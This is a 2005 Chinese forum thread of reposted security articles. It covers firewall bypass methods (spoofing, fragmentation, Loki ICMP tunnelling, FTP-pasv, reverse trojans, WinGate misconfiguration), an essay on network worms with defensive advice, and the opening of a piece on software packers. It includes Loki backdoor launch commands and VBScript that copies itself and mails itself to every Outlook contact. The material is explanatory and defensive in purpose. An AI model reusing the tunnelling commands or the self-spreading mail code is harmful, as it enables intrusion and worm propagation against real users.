一般服务器都有关于帐户锁定的安全策略，比如，某个帐户连续3次登陆失败，那么这个帐号将被锁定。这点也可以被破坏者利用，他们伪装一个帐号去错误登陆，这样使得这个帐号被锁定，而正常的合法用户就不能使用这个帐号去登陆系统了。 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:04pm 

如何突破各种防火墙 


现在随着人们的安全意识加强，防火墙一般都被公司企业采用来保障网络的安全，一般的攻击者在有防火墙的情况下，一般是很难入侵的。下面谈谈有防火墙环境下的攻击和检测。 

　　一 防火墙基本原理 

　　首先，我们需要了解一些基本的防火墙实现原理。防火墙目前主要分包过滤，和状态检测的包过滤，应用层代理防火墙。但是他们的基本实现都是类似的。 

│ │---路由器-----网卡│防火墙│网卡│----------内部网络│ │ 

　　防火墙一般有两个以上的网络卡，一个连到外部（router)，另一个是连到内部网络。当打开主机网络转发功能时，两个网卡间的网络通讯能直接通过。当有防火墙时，他好比插在网卡之间，对所有的网络通讯进行控制。 

　　说到访问控制，这是防火墙的核心了：），防火墙主要通过一个访问控制表来判断的，他的形式一般是一连串的如下规则： 

　　1 accept from+ 源地址，端口 to+ 目的地址，端口+ 采取的动作 

　　2 deny ...........（deny就是拒绝。。) 

　　3 nat ............(nat是地址转换。后面说） 

　　防火墙在网络层（包括以下的炼路层）接受到网络数据包后，就从上面的规则连表一条一条地匹配，如果符合就执行预先安排的动作了！如丢弃包。。。。 

　　但是，不同的防火墙，在判断攻击行为时，有实现上的差别。下面结合实现原理说说可能的攻击。 


　　二 攻击包过滤防火墙 

　　包过滤防火墙是最简单的一种了，它在网络层截获网络数据包，根据防火墙的规则表，来检测攻击行为。他根据数据包的源IP地址；目的IP地址；TCP/UDP源端口；TCP/UDP目的端口来过滤！！很容易受到如下攻击： 

　　1 ip 欺骗攻击： 

　　这种攻击，主要是修改数据包的源，目的地址和端口，模仿一些合法的数据包来骗过防火墙的检测。如：外部攻击者，将他的数据报源地址改为内部网络地址，防火墙看到是合法地址就放行了：）。可是，如果防火墙能结合接口，地址来匹配，这种攻击就不能成功了：（ 

　　2 d.o.s拒绝服务攻击 

　　简单的包过滤防火墙不能跟踪 tcp的状态，很容易受到拒绝服务攻击，一旦防火墙受到d.o.s攻击，他可能会忙于处理，而忘记了他自己的过滤功能。：）你就可以饶过了，不过这样攻击还很少的。！ 

　　3 分片攻击 

　　这种攻击的原理是：在IP的分片包中，所有的分片包用一个分片偏移字段标志分片包的顺序，但是，只有第一个分片包含有TCP端口号的信息。当IP分片包通过分组过滤防火墙时，防火墙只根据第一个分片包的Tcp信息判断是否允许通过，而其他后续的分片不作防火墙检测，直接让它们通过。 

　　这样，攻击者就可以通过先发送第一个合法的IP分片，骗过防火墙的检测，接着封装了恶意数据的后续分片包就可以直接穿透防火墙，直接到达内部网络主机，从而威胁网络和主机的安全。 

　　4 木马攻击 

　　对于包过滤防火墙最有效的攻击就是木马了，一但你在内部网络安装了木马，防火墙基本上是无能为力的。 

　　原因是：包过滤防火墙一般只过滤低端口（1-1024），而高端口他不可能过滤的（因为，一些服务要用到高端口，因此防火墙不能关闭高端口的），所以很多的木马都在高端口打开等待，如冰河，subseven等。。。 

　　但是木马攻击的前提是必须先上传，运行木马，对于简单的包过滤防火墙来说，是容易做的。这里不写这个了。大概就是利用内部网络主机开放的服务漏洞。 
　　 
　　早期的防火墙都是这种简单的包过滤型的，到现在已很少了，不过也有。现在的包过滤采用的是状态检测技术，下面谈谈状态检测的包过滤防火墙。 

　　三 攻击状态检测的包过滤 

　　状态检测技术最早是checkpoint提出的，在国内的许多防火墙都声称实现了状态检测技术。 

　　可是：）很多是没有实现的。到底什么是状态检测？ 

　　一句话，状态检测就是从tcp连接的建立到终止都跟踪检测的技术。 

　　原先的包过滤，是拿一个一个单独的数据包来匹配规则的。可是我们知道，同一个tcp连接，他的数据包是前后关联的，先是syn包，-》数据包=》fin包。数据包的前后序列号是相关的。 
　 
　　如果割裂这些关系，单独的过滤数据包，很容易被精心够造的攻击数据包欺骗！！！如nmap的攻击扫描，就有利用syn包，fin包，reset包来探测防火墙后面的网络。！ 

　　相反，一个完全的状态检测防火墙，他在发起连接就判断，如果符合规则，就在内存登记了这个连接的状态信息（地址，port，选项。。）,后续的属于同一个连接的数据包，就不需要在检测了。直接通过。而一些精心够造的攻击数据包由于没有在内存登记相应的状态信息，都被丢弃了。这样这些攻击数据包，就不能饶过防火墙了。 

　　说状态检测必须提到动态规则技术。在状态检测里，采用动态规则技术，原先高端口的问题就可以解决了。实现原理是：平时，防火墙可以过滤内部网络的所有端口(1-65535),外部攻击者难于发现入侵的切入点，可是为了不影响正常的服务，防火墙一但检测到服务必须开放高端口时，如（ftp协议，irc等），防火墙在内存就可以动态地天加一条规则打开相关的高端口。等服务完成后，这条规则就又被防火墙删除。这样，既保障了安全，又不影响正常服务，速度也快。！ 

　　一般来说，完全实现了状态检测技术防火墙，智能性都比较高，一些扫描攻击还能自动的反应，因此，攻击者要很小心才不会被发现。 

　　但是，也有不少的攻击手段对付这种防火墙的。 

　　1 协议隧道攻击 

　　协议隧道的攻击思想类似与VPN的实现原理，攻击者将一些恶意的攻击数据包隐藏在一些协议分组的头部，从而穿透防火墙系统对内部网络进行攻击。 

　　例如，许多简单地允许ICMP回射请求、ICMP回射应答和UDP分组通过的防火墙就容易受到ICMP和UDP协议隧道的攻击。Loki和lokid（攻击的客户端和服务端）是实施这种攻击的有效的工具。在实际攻击中，攻击者首先必须设法在内部网络的一个系统上安装上lokid服务端，而后攻击者就可以通过loki客户端将希望远程执行的攻击命令（对应IP分组）嵌入在ICMP或UDP包头部，再发送给内部网络服务端lokid，由它执行其中的命令，并以同样的方式返回结果。由 

　　于许多防火墙允许ICMP和UDP分组自由出入，因此攻击者的恶意数据就能附带在正常的分组，绕过防火墙的认证，顺利地到达攻击目标主机下面的命令是用于启动lokid服务器程序： 

lokid-pCICvl 

loki客户程序则如下启动： 

lokiCd172.29.11.191(攻击目标主机)-pCICv1Ct3 

　　这样，lokid和loki就联合提供了一个穿透防火墙系统访问目标系统的一个后门。 

　　2 利用FTP-pasv绕过防火墙认证的攻击 

　　FTP-pasv攻击是针对防火墙实施入侵的重要手段之一。目前很多防火墙不能过滤这种攻击手段。如CheckPoint的Firewall-1，在监视FTP服务器发送给客户端的包的过程中，它在每个包中寻找"227"这个字符串。如果发现这种包，将从中提取目标地址和端口，并对目标地址加以验证，通过后，将允许建立到该地址的TCP连接。 

　　攻击者通过这个特性，可以设法连接受防火墙保护的服务器和服务。详细的描述可见：http://www.checkpoint.com/techsupport/alerts/pasvftp.html。 

　　3 反弹木马攻击 

　　反弹木马是对付这种防火墙的最有效的方法。攻击者在内部网络的反弹木马定时地连接外部攻击者控制的主机，由于连接是从内部发起的，防火墙（任何的防火墙）都认为是一个合法的连接，因此基本上防火墙的盲区就是这里了。防火墙不能区分木马的连接和合法的连接。 

　　但是这种攻击的局限是：必须首先安装这个木马！！！所有的木马的第一步都是关键！！！ 

　　四 攻击代理 

　　代理是运行在应用层的防火墙，他实质是启动两个连接，一个是客户到代理，另一个是代理到目的服务器。 

　　实现上比较简单，和前面的一样也是根据规则过滤。由于运行在应用层速度比较慢/1 

　　攻击代理的方法很多。 

　　这里就以wingate为例，简单说说了。（太累了） 

　　WinGate是目前应用非常广泛的一种Windows95/NT代理防火墙软件，内部用户可以通过一台安装有WinGate的主机访问外部网络，但是它也存在着几个安全脆弱点。 

　　黑客经常利用这些安全漏洞获得WinGate的非授权Web、Socks和Telnet的访问，从而伪装成WinGate主机的身份对下一个攻击目标发动攻击。因此，这种攻击非常难于被跟踪和记录。 
　　 
　　导致WinGate安全漏洞的原因大多数是管理员没有根据网络的实际情况对WinGate代理防火墙软件进行合理的设置，只是简单地从缺省设置安装完毕后就让软件运行，这就给攻击者可乘之机。 

　　1 非授权Web访问 

　　某些WinGate版本（如运行在NT系统下的2.1d版本）在误配置情况下，允许外部主机完全匿名地访问因特网。因此，外部攻击者就可以利用WinGate主机来对Web服务器发动各种Web攻击（ 如CGI的漏洞攻击等），同时由于Web攻击的所有报文都是从80号Tcp端口穿过的，因此，很难追踪到攻击者的来源。 

　　检测 

　　检测WinGate主机是否有这种安全漏洞的方法如下： 

　　1) 以一个不会被过滤掉的连接（譬如说拨号连接）连接到因特网上。 

　　2) 把浏览器的代理服务器地址指向待测试的WinGate主机。 

　　如果浏览器能访问到因特网，则WinGate主机存在着非授权Web访问漏洞。 


　　2 非授权Socks访问 

　　在WinGate的缺省配置中，Socks代理（1080号Tcp端口）同样是存在安全漏洞。与打开的Web代理（80号Tcp端口）一样，外部攻击者可以利用Socks代理访问因特网。 


　　防范 

　　要防止攻击WinGate的这个安全脆弱点，管理员可以限制特定服务的捆绑。在多宿主（multi homed）系统上，执行以下步骤以限定如何提供代理服务。 

　　1选择Socks或WWWProxyServer属性。 

　　2选择Bindings标签。 

　　3按下ConnectiollBeAcceptedOnTheFollowingInterfaceOnly按钮，并指定本WinGate服务器的内部接口。 

　　非授权Telnet访问 

　　它是WinGate最具威胁的安全漏洞。通过连接到一个误配置的WinGate服务器的Telnet服务，攻击者可以使用别人的主机隐藏自己的踪迹，随意地发动攻击。 

　　检测 

　　检测WinGate主机是否有这种安全漏洞的方法如下： 

　　1.使用telnet尝试连接到一台WinGate服务器。 

[root@happy/tmp]#telnet172.29.11.191 

Trying172.29.11.191…. 

Connectedto172.29.11.191. 

Escapecharacteris‘^]’. 

Wingate>10.50.21.5 


　　2.如果接受到如上的响应文本，那就输入待连接到的网站。 


　　3.如果看到了该新系统的登录提示符，那么该服务器是脆弱的。 

Connectedtohost10.50.21.5…Connected 

SunOS5.6 

Login: 

　　对策 

　　防止这种安全脆弱点的方法和防止非授权Socks访问的方法类似。在WinGate中简单地限制特定服务的捆绑就可以解决这个问题。一般来说，在多宿主（multihomed）系统管理员可以通过执行以下步骤来完成： 

　　1.选择TelnetSever属性。 

　　2.选择Bindings标签。 

　　3.按下ConnectiollBeAcceptedOnTheFollowingInterfaceOnly按钮，并指定本WinGate服务器的内部接口。 


　　五 后话 

　　有防火墙的攻击不单是上面的一点，我有什么写的不对的，大家指正。 

　　一直以来，黑客都在研究攻击防火墙的技术和手段，攻击的手法和技术越来越智能化和多样化。但是就黑客攻击防火墙的过程上看，大概可以分为三类攻击。 

　　第一类攻击防火墙的方法是探测在目标网络上安装的是何种防火墙系统并且找出此防火墙系统允许哪些服务。我们叫它为对防火墙的探测攻击。 

　　第二类攻击防火墙的方法是采取地址欺骗、TCP序号攻击等手法绕过防火墙的认证机制，从而 对防火墙和内部网络破坏。 

　　第三类攻击防火墙的方法是寻找、利用防火墙系统实现和设计上的安全漏洞，从而有针对性地发动攻击。这种攻击难度比较大，可是破坏性很大。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:04pm 

蠕虫技术（上） 

凡能够引起计算机故障，破坏计算机数据的程序统称为计算 

机病毒。所以从这个意义上说，蠕虫也是一种病毒！网络蠕虫病毒, 

作为对互联网危害严重的一种计算机程序,其破坏力和传染性不容忽 

视.与传统的病毒不同，蠕虫病毒以计算机为载体，以网络为攻击对 

象！本文中将蠕虫病毒分为针对企业网络和个人用户2类，并从企业 

用户和个人用户两个方面探讨蠕虫病毒的特征和一些防范措施!
本文根据蠕虫病毒的发作机制，将其分为利用系统级别漏洞（主动传 

播）和利用社会工程学(欺骗传播)两种，并从用户角度中将蠕虫病毒 

分为针对企业网络和个人用户2类，从企业用户和个人用户两个方面 

探讨蠕虫病毒的特征和一些防范措施!
一 蠕虫病毒定义
1蠕虫病毒的定义
2蠕虫病毒与一般病毒的异同
3蠕虫病毒的危害和趋势
二 蠕虫病毒的分析和防范
1企业用户的防止蠕虫
2个人用户防止蠕虫
三 研究蠕虫的现实意义
一 蠕虫病毒的定义
1.1蠕虫病毒的定义
计算机病毒自出现之日起，就成为计算机的一个巨大威胁，而当网络 

迅速发展的时候，蠕虫病毒引起的危害开始显现！从广义上定义，凡 

能够引起计算机故障，破坏计算机数据的程序统称为计算机病毒。所 

以从这个意义上说，蠕虫也是一种病毒！但是蠕虫病毒和一般的病毒 

有着很大的区别.对于蠕虫,现在还没有一个成套的理论体系,一般认 

为,蠕虫是一种通过网络传播的恶性病毒,它具有病毒的一些共性,如 

传播性,隐蔽性,破坏性等等,同时具有自己的一些特征，如不利用文 

件寄生（有的只存在于内存中）,对网络造成拒绝服务，以及和黑客 

技术相结合等等！在产生的破坏性上，蠕虫病毒也不是普通病毒所能 

比拟的，网络的发展使得蠕虫可以在短短的时间内蔓延整个网络，造 

成网络瘫痪！
在本论文中,根据使用者情况将蠕虫病毒分为2类,一种是面向企业用 

户和局域网而言，这种病毒利用系统漏洞,主动进行攻击,可以对整个 

互联网可造成瘫痪性的后果!以“红色代码”，“尼姆达”，以及最 

新的“sql蠕虫王”为代表。另外一种是针对个人用户的,通过网络( 

主要是电子邮件,恶意网页形式)迅速传播的蠕虫病毒,以爱虫病毒,求 

职信病毒为例.在这两类中，第一类具有很大的主动攻击性，而且爆 

发也有一定的突然性，但相对来说，查杀这种病毒并不是很难。第二 

种病毒的传播方式比较复杂和多样，少数利用了微软的应用程序的漏 

洞，更多的是利用社会工程学()对用户进行欺骗和诱使，这样的病毒 

造成的损失是非常大的，同时也是很难根除的，比如求职信病毒，在 

2001年就已经被各大杀毒厂商发现，但直到2002年底依然排在病毒危 

害排行榜的首位就是证明！出得在接下来的内容中,将分别分析这两 

种病毒的一些特征及防范措施! 



1.2蠕虫病毒与一般病毒的异同
蠕虫也是一种病毒，因此具有病毒的共同特征。一般的病毒是需要的 

寄生的,它可以通过自己指令的执行，将自己的指令代码写到其他程 

序的体内，而被感染的文件就被称为”宿主”,例如,windows下可执 

行文件的格式为pe格式(Portable Executable),当需要感染pe文件时 

,在宿主程序中，建立一个新节，将病毒代码写到新节中，修改的程 

序入口点等，这样，宿主程序执行的时候，就可以先执行病毒程序， 

病毒程序运行完之后，在把控制权交给宿主原来的程序指令。可见， 

病毒主要是感染文件，当然也还有像DIRII这种链接型病毒，还有引 

导区病毒。引导区病毒他是感染磁盘的引导区，如果是软盘被感染， 

这张软盘用在其他机器上后，同样也会感染其他机器，所以传播方式 

也是用软盘等方式。
蠕虫一般不采取利用pe格式插入文件的方法,而是复制自身在互联网 

环境下进行传播，病毒的传染能力主要是针对计算机内的文件系统而 

言,而蠕虫病毒的传染目标是互联网内的所有计算机.局域网条件下的 

共享文件夹，电子邮件email,网络中的恶意网页,大量存在着漏洞的 

服务器等都成为蠕虫传播的良好途径。网络的发展也使得蠕虫病毒可 

以在几个小时内蔓延全球!而且蠕虫的主动攻击性和突然爆发性将使 

得人们手足无策!
普通病毒 蠕虫病毒
存在形式 寄存文件 独立程序
传染机制 宿主程序运行 主动攻击
传染目标 本地文件 网络计算机 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:04pm 

蠕虫技术（中） 


可以预见,未来能够给网络带来重大灾难的主要必定是网络蠕虫!
1.3蠕虫的破坏和发展趋势
1988年一个由美国CORNELL大学研究生莫里斯编写的蠕虫病毒蔓延造 

成了数千台计算机停机，蠕虫病毒开始现身网络;而后来的红色代码 

，尼姆达病毒疯狂的时候，造成几十亿美元的损失;北京时间2003年1 

月26日, 一种名为“2003蠕虫王”的电脑病毒迅速传播并袭击了全球 

，致使互联网网路严重堵塞，作为互联网主要基础的域名服务器 

（DNS）的瘫痪造成网民浏览互联网网页及收发电子邮件的速度大幅 

减缓, 同时银行自动提款机的运作中断, 机票等网络预订系统的运作 

中断, 信用卡等收付款系统出现故障!专家估计,此病毒造成的直接经 

济损失至少在12亿美元以上!
病毒名称 持续时间 造成损失
莫里斯蠕虫 1988年 6000多台计算机停机,直接经济损失达9600万美 

元!
美丽杀手 1999年3月 政府部门和一些大公司紧急关闭了网络服务器, 

经济损失超过12亿美元!
爱虫病毒 2000年5月至今 众多用户电脑被感染，损失超过100亿美元 

以上,
红色代码 2001年7月 网络瘫痪，直接经济损失超过26亿美元
求职信 2001年12月至今 大量病毒邮件堵塞服务器，损失达数百亿美 

元
Sql蠕虫王 2003年1月 网络大面积瘫痪,银行自动提款机运做中断,直 

接经济损失超过26亿美元
由表可以知道,蠕虫病毒对网络产生堵塞作用,并造成了巨大的经济损 

失!
通过对以上蠕虫病毒的分析,可以知道,蠕虫发作的一些特点和发展趋 

势:
1.利用操作系统和应用程序的漏洞主动进行攻击.. 此类病毒主要是 

“红色代码”和“尼姆达”,以及至今依然肆虐的”求职信”等.由于 

IE浏览器的漏洞(Ｉｆｒａｍｅ ＥｘｅｃＣｏｍｍａｎｄ)，使得感 

染了“尼姆达”病毒的邮件在不去手工打开附件的情况下病毒就能激 

活，而此前即便是很多防病毒专家也一直认为，带有病毒附件的邮件 

，只要不去打开附件，病毒不会有危害。“红色代码”是利用了微软 

IIS服务器软件的漏洞(idq.dll远程缓存区溢出)来传播。Sql蠕虫王 

病毒则是利用了微软的数据库系统的一个漏洞进行大肆攻击! 
2传播方式多样 如“尼姆达”病毒和”求职信”病毒，可利用的传播 

途径包括文件、电子邮件、Web服务器、网络共享等等.
　 3.病毒制作技术新 与传统的病毒不同的是，许多新病毒是利用当 

前最新的编程语言与编程技术实现的，易于修改以产生新的变种，从 

而逃避反病毒软件的搜索。另外，新病毒利用Java、ActiveX、VB 

Script等技术，可以潜伏在HTML页面里，在上网浏览时触发。　　 



4.与黑客技术相结合! 潜在的威胁和损失更大!以红色代码为例, 

感染后的机器的web目录的\scripts下将生成一个root.exe,可以远程 

执行任何命令,从而使黑客能够再次进入! 


二网络蠕虫病毒分析和防范
蠕虫和普通病毒不同的一个特征是蠕虫病毒往往能够利用漏洞，这里 

的漏洞或者说是缺陷，我们分为2种，软件上的缺陷和人为上的缺陷 

。软件上的缺陷，如远程溢出，微软ie和outlook的自动执行漏洞等 

等，需要软件厂商和用户共同配合，不断的升级软件。而人为的缺陷 

，主要是指的是计算机用户的疏忽。这就是所谓的社会工程学 

(social engineering),当收到一封邮件带着病毒的求职信邮件时候 

，大多数人都会报着好奇去点击的。对于企业用户来说，威胁主要集 

中在服务器和大型应用软件的安全上，而个人用户而言，主要是防范 

第二种缺陷。
2.1利用系统漏洞的恶性蠕虫病毒分析
在这种病毒中,以红色代码,尼姆达和sql蠕虫为代表!他们共同的特征 

是利用微软服务器和应用程序组件的某个漏洞进行攻击,由于网上存 

在这样的漏洞比较普遍,使得病毒很容易的传播!而且攻击的对象大都 

为服务器,所以造成的网络堵塞现象严重! 
以2003年1月26号爆发的sql蠕虫为例,爆发数小时内席卷了全球网络, 

造成网络大塞车.亚洲国家中以人口上网普及率达七成的韩国所受影 

响较为严重。韩国两大网络业KFT及南韩电讯公司，系统都陷入了瘫 

痪，其它的网络用户也被迫断线,更为严重的是许多银行的自动取款 

机都无法正常工作, 美国许美国银行统计，该行的13000台自动柜员 

机已经无法提供正常提款。网络蠕虫病毒开始对人们的生活产生了巨 

大的影响!
这次sql蠕虫攻击的是微软数据库系Microsoft SQL Server 2000的， 

利用了MSSQL2000服务远程堆栈缓冲区溢出漏洞, Microsoft SQL 

Server 2000是一款由Microsoft公司开发的商业性质大型数据库系统 

。 SQL Server监听UDP的1434端口，客户端可以通过发送消息到这个 

端口来查询目前可用的连接方式（连接方式可以是命名管道也可以是 

TCP），但是此程序存在严重漏洞，当客户端发送超长数据包时，将 

导致缓冲区溢出，黑客可以利用该漏洞在远程机器上执行自己的恶意 

代码。
微软在200年7月份的时候就为这个漏洞发布了一个安全公告,但当sql 

蠕虫爆发的时候,依然有大量的装有ms sqlserver 2000的服务器没有 

安装最新的补丁,从而被蠕虫病毒所利用,蠕虫病毒通过一段376个字 

节的恶意代码,远程获得对方主机的系统控制权限, 取得三个Win32 

API地址，GetTickCount、socket、sendto，接着病毒使用 

GetTickCount获得一个随机数，进入一个死循环继续传播。在该循环 

中蠕虫使用获得的随机数生成一个随机的ip地址，然后将自身代码发 

送至1434端口(Microsoft SQL Server开放端口)，该蠕虫传播速度极 

快，其使用广播数据包方式发送自身代码，每次均攻击子网中所有 

255台可能存在机器。由于这是一个死循环的过程，发包密度仅和机 

器性能和网络带宽有关，所以发送的数据量非常大。该蠕虫对被感染 

机器本身并没有进行任何恶意破坏行为，也没有向硬盘上写文件，仅 

仅存在与内存中。对于感染的系统，重新启动后就可以清除蠕虫，但 

是仍然会重复感染。由于发送数据包占用了大量系统资源和网络带宽 

，形成Udp Flood，感染了该蠕虫的网络性能会极度下降。一个百兆 

网络内只要有一两台机器感染该蠕虫就会导致整个网络访问阻塞。
通过以上分析可以知道,此蠕虫病毒本身除了对网络产生拒绝服务攻 

击外,并没有别的破坏措施.但如果病毒编写者在编写病毒的时候加入 

破坏代码,后果将不堪设想! 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:05pm 

蠕虫技术（下） 


2.3企业防范蠕虫病毒措施
此次sql蠕虫病毒，利用的漏洞在2002年7月份微软的一份安全公告中 

就有详细说明！而且微软也提供了安全补丁提供下载，然而在时隔半 

年之后互联网上还有相当大的一部分服务器没有安装最新的补丁，其 

网络管理员的安全防范意识可见一斑！
当前，企业网络主要应用于文件和打印服务共享、办公自动化系统、 

企业业务（MIS）系统、Internet应用等领域。网络具有便利信息交 

换特性，蠕虫病毒也可以充分利用网络快速传播达到其阻塞网络目的 

。企业在充分地利用网络进行业务处理时，就不得不考虑企业的病毒 

防范问题，以保证关系企业命运的业务数据完整不被破坏。
企业防治蠕虫病毒的时候需要考虑几个问题：病毒的查杀能力，病毒 

的监控能力，新病毒的反应能力。而企业防毒的一个重要方面是是管 

理和策略。推荐的企业防范蠕虫病毒的策略如下：
1． 加强网络管理员安全管理水平，提高安全意识。由于蠕虫病毒利 

用的是系统漏洞进行攻击，所以需要在第一时间内保持系统和应用软 

件的安全性,保持各种操作系统和应用软件的更新！由于各种漏洞的 

出现，使得安全不在是一种一劳永逸的事，而作为企业用户而言，所 

经受攻击的危险也是越来越大，要求企业的管理水平和安全意识也越 

来越高！
2． 建立病毒检测系统。能够在第一时间内检测到网络异常和病毒攻 

击。
3． 建立应急响应系统，将风险减少到最小！由于蠕虫病毒爆发的突 

然性，可能在病毒发现的时候已经蔓延到了整个网络，所以在突发情 

况下，建立一个紧急响应系统是很有必要的，在病毒爆发的第一时间 

即能提供解决方案。
4． 建立灾难备份系统。对于数据库和数据系统，必须采用定期备份 

，多机备份措施，防止意外灾难下的数据丢失！
5． 对于局域网而言，可以采用以下一些主要手段：（1）在因特网 

接入口处安装防火墙式防杀计算机病毒产品，将病毒隔离在局域网之 

外。（2）对邮件服务器进行监控，防止带毒邮件进行传播！（3）对 

局域网用户进行安全培训。（4）建立局域网内部的升级系统，包括 

各种操作系统的补丁升级，各种常用的应用软件升级，各种杀毒软件 

病毒库的升级等等！ 



.3对个人用户产生直接威胁的蠕虫病毒
在以上分析的蠕虫病毒中，只对安装了特定的微软组件的系统进行攻 

击，而对广大个人用户而言，是不会安装iis(微软的因特网服务器程 

序，可以使允许在网上提供web服务)或者是庞大的数据库系统的！因 

此上述病毒并不会直接攻击个个人用户的电脑(当然能够间接的通过 

网络产生影响)，但接下来分析的蠕虫病毒，则是对个人用户威胁最 

大，同时也是最难以根除，造成的损失也更大的一类蠕虫病毒！ 
对于个人用户而言，威胁大的蠕虫病毒采取的传播方式一般为电子邮 

件(Email)以及恶意网页等等！
对于利用email传播得蠕虫病毒来说，通常利用的是社会工程学 

(Social Engineering),即以各种各样的欺骗手段那诱惑用户点击的 

方式进行传播！
恶意网页确切的讲是一段黑客破坏代码程序，它内嵌在网页中，当用 

户在不知情的情况下打开含有病毒的网页时，病毒就会发作。这种病 

毒代码镶嵌技术的原理并不复杂，所以会被很多怀不良企图者利用， 

在很多黑客网站竟然出现了关于用网页进行破坏的技术的论坛，并提 

供破坏程序代码下载，从而造成了恶意网页的大面积泛滥，也使越来 

越多的用户遭受损失。
对于恶意网页，常常采取vb script和java script编程的形式！由于 

编程方式十分的简单！所以在网上非常的流行！
Vb script和java script是由微软操作系统的wsh（Windows 

Scripting HostWindows脚本主机）解析并执行的，由于其编程非常 

简单，所以此类脚本病毒在网上疯狂传播，疯狂一时的爱虫病毒就是 

一种vbs脚本病毒，然后伪装成邮件附件诱惑用户点击运行，更为可 

怕的是，这样的病毒是以源代码的形式出现的，只要懂得一点关于脚 

本编程的人就可以修改其代码，形成各种各样的变种。
下面以一个简单的脚本为例：
Set objFs=CreateObject （“Scripting.FileSystemObject”）(创 

建一个文件系统对象)　　objFs.CreateTextFile 

（"C:\virus.txt", 1）(通过文件系统对象的方法创建了TXT文件)　 

　如果我们把这两句话保存成为.vbs的VB脚本文件，点击就会在C盘 

中创建一个TXT文件了。倘若我们把第二句改为：
objFs.GetFile （WScript.ScriptFullName）.Copy 

（"C:\virus.vbs"）
就可以将自身复制到C盘virus.vbs这个文件。本句前面是打开这个脚 

本文件，WScript.ScriptFullName指明是这个程序本身，是一个完整 

的路径文件名。GetFile函数获得这个文件，Copy函数将这个文件复 

制到C盘根目录下virus.vbs这个文件。这么简单的两句就实现了自我 

复制的功能，已经具备病毒的基本特征――自我复制能力。
此类病毒往往是通过邮件传播的，在vb script中调用邮件发送功能 

也非常的简单，病毒往往采用的方法是向outlook中的地址薄中的邮 

件地址发送带有包含自身的邮件来达到传播目的，一个简单的实例如 

下：
Set objOA=Wscript.CreateObject （"Outlook.Application"）（创 

建一个OUTLOOK应用的对象）
Set objMapi=objOA.GetNameSpace （"MAPI"）（取得MAPI名字空间 

）
For i=1 to objMapi.AddressLists.Count（遍历地址簿） 
Set objAddList=objMapi.AddressLists （i） 
For j=1 To objAddList. AddressEntries.Count 
Set objMail=objOA.CreateItem （0） 
objMail.Recipients.Add （objAddList. AddressEntries （j）） 

（取得收件人邮件地址 ）　　objMail.Subject="你好!" （设置邮 

件主题，这个往往具有很大的诱惑性质）
objMail.Body="这次给你的附件，是我的新文档！" （设置信件内容 

）
objMail.Attachments.Add （“c:\virus.vbs"）（把自己作为附件 

扩散出去 ）
objMail.Send　　（发送邮件）
Next
Next 
Set objMapi=Nothing　　（清空objMapi变量，释放资源）
set objOA=Nothing　　(清空objOA变量)
　　这一小段代码的功能是向地址簿中的用户发送电子邮件，并将自 

己作为附件扩散出去。这段代码中的第一行是创建一个Outlook的对 

象，是必不可少的。在其下是一个循环，在循环中不断地向地址簿中 

的电子邮件地址发送内容相同的信件。这就是蠕虫的传播性。
由此可以看出，利用vb script编写病毒是非常容易的，这就使得此 

类病毒的变种繁多，破坏力极大，同时也是非常难以根除的！ 
2.4个人用户对蠕虫病毒的防范措施
通过上述的分析，我们可以知道，病毒并不是非常可怕的，网络蠕虫 

病毒对个人用户的攻击主要还是通过社会工程学，而不是利用系统漏 

洞！所以防范此类病毒需要注意以下几点： 



1．购合适的杀毒软件！网络蠕虫病毒的发展已经使传统的杀毒软件 

的“文件级实时监控系统”落伍，杀毒软件必须向内存实时监控和邮 

件实时监控发展！另外面对防不胜防的网页病毒，也使得用户对杀毒 

软件的要求越来越高！在杀毒软件市场上，赛门铁克公司的norton系 

列杀毒软件在全球具有很大的比例！经过多项测试,norton杀毒系列 

软件脚本和蠕虫阻拦技术能够阻挡大部分电子邮件病毒,而且对网页 

病毒也有相当强的防范能力!目前国内的杀毒软件也具有了相当高的 

水平.像瑞星,kv系列等杀毒软件,在杀毒软件的同时整合了防火强功 

能,从而对蠕虫兼木马程序有很大克制作用.
2 。经常升级病毒库,杀毒软件对病毒的查杀是以病毒的特征码为依 

据的,而病毒每天都层出不穷,尤其是在网络时代,蠕虫病毒的传播速 

度快,变种多,所以必须随时更新病毒库,以便能够查杀最新的病毒!
3．提高防杀毒意识.不要轻易去点击陌生的站点，有可能里面就含有 

恶意代码！
当运行IE时，点击“工具→Internet选项→安全→ Internet区域的 

安全级别”，把安全级别由“中”改为“高” 。、因为这一类网页 

主要是含有恶意代码的ActiveX或Applet、 javascript的网页文件 

，所以在IE设置中将ActiveX插件和控件、Java脚本等全部禁止就可 

以大大减少被网页恶意代码感染的几率。具体方案是：在IE窗口中点 

击“工具”→“Internet选项”，在弹出的对话框中选择“安全”标 

签，再点击“自定义级别”按钮，就会弹出“安全设置”对话框，把 

其中所有ActiveX插件和控件以及与Java相关全部选项选择“禁用” 

。但是，这样做在以后的网页浏览过程中有可能会使一些正常应用 

ActiveX的网站无法浏览。
4．不随意查看陌生邮件，尤其是带有附件的邮件，，由于有的病毒 

邮件能够利用ie和outlook的漏洞自动执行，所以计算机用户需要升 

级ie和outlook程序，及常用的其他应用程序！ 


三小结
网络蠕虫病毒作为一种互联网高速发展下的一种新型病毒，必将对网 

络产生巨大的危险。在防御上，已经不再是由单独的杀毒厂商所能够 

解决，而需要网络安全公司，系统厂商，防病毒厂商及用户共同参与 

，构筑全方位的防范体系！
蠕虫和黑客技术的结合，使得对蠕虫的分析，检测和防范具有一定的 

难度，同时对蠕虫的网络传播性，网络流量特性建立数学模型也是有 

待研究的工作！ 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:05pm 

壳（上） 


　　首先我想大家应该先明白“壳”的概念。在自然界中，我想大家对壳这东西应该都不会陌生了，植物用它来保护种子，动物用它来保护身体等等。同样，在一些计算机软件里也有一段专门负责保护软件不被非法修改或反编译的程序。它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。就像动植物的壳一般都是在身体外面一样理所当然（但后来也出现了所谓的“壳中带籽”的壳）。由于这段程序和自然界的壳在功能上有很多相同的地方，基于命名的规则，大家就把这样的程序称为“壳”了。就像计算机病毒和自然界的病毒一样，其实都是命名上的方法罢了。 

